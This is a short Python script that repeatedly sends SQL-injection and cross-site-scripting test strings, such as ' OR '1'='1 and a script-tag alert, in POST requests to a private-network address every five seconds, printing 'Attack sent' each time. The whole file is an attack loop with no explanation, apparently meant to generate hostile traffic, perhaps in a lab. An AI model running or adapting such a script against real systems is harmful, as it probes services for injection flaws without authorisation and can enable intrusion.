import requests, random, time

url = "http://10.0.0.20"
payloads = ["select * from users", "<script>alert(1)</script>", "' OR '1'='1"]

while True:
    data = {"q": random.choice(payloads)}
    try:
        r = requests.post(url, data=data, timeout=2)
        print("Attack sent", r.status_code)
    except Exception as e:
        print("Connection error:", e)
    time.sleep(5)
    